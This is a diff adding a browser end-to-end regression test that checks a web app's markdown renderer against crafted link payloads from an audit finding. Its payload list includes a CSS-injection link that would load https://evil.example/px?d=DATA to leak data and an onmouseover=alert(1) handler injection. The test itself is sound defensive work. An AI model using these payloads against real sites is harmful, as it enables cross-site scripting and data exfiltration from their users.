@@ -523,6 +523,32 @@ const flows = {
     await page.waitForSelector('#thread table', { timeout: 10000 }).catch(() => {});
     check('markdown: lists, code and tables render', await page.evaluate(() => { const h = [...document.querySelectorAll('#thread .msg')].pop()?.innerHTML || ''; return ['<strong>', '<li>', '<table>', '<code>'].every(t => h.includes(t)); }));
   },
+  async markdownInjection({ page, check }) {
+    // audit S1: a placeholder of a first link must never be expanded inside the href of a second one
+    const outside = [];
+    const spy = r => { if (!r.url().startsWith(new URL(page.url()).origin) && !r.url().startsWith('data:')) outside.push(r.url()); };
+    page.on('request', spy);
+    const payloads = [
+      '[a](https://evil.example/[b](tel:/style=position:fixed;inset:0;z-index:99999;background:url\\(https://evil.example/px?d=DATA\\);x:))',
+      '[a](https://evil.example/`x`onmouseover=alert(1)//)',
+      '[a](https://evil.example/\u00000\u0000)',
+      '[a](#library/\\)x)',
+    ];
+    const res = await page.evaluate(ps => {
+      const boxes = ps.map(p => { const b = document.createElement('div'); b.className = 'md-probe doc'; b.innerHTML = md(p); document.body.appendChild(b); return b; });
+      const out = boxes.map(b => [...b.querySelectorAll('*')].flatMap(e => [...e.attributes].map(a => a.name)).filter(n => n === 'style' || n.startsWith('on')));
+      const box = document.createElement('div'); box.className = 'md-probe'; document.body.appendChild(box);
+      box.innerHTML = md('see [the doc](https://example.org/a) and **[bold link](https://example.org/b)**');
+      const links = [...box.querySelectorAll('a')].map(a => [a.getAttribute('href'), a.closest('strong') ? 'b' : '', a.textContent]);
+      return { out, links };
+    }, payloads);
+    await page.waitForTimeout(800); // the rendered payloads stay on screen: a background image would load now
+    page.off('request', spy);
+    await page.evaluate(() => document.querySelectorAll('.md-probe').forEach(b => b.remove()));
+    check('markdown: no style or on* attribute comes out of a crafted link', res.out.every(a => a.length === 0), JSON.stringify(res.out));
+    check('markdown: a crafted link sends no request to another host', outside.length === 0, outside.join(' '));
+    check('markdown: a plain link and a link in bold still render', JSON.stringify(res.links) === JSON.stringify([['https://example.org/a', '', 'the doc'], ['https://example.org/b', 'b', 'bold link']]), JSON.stringify(res.links));
+  },
   async cardText({ page, check }) {
     await go(page, 'board');
     await page.click('#view-board .kcard');
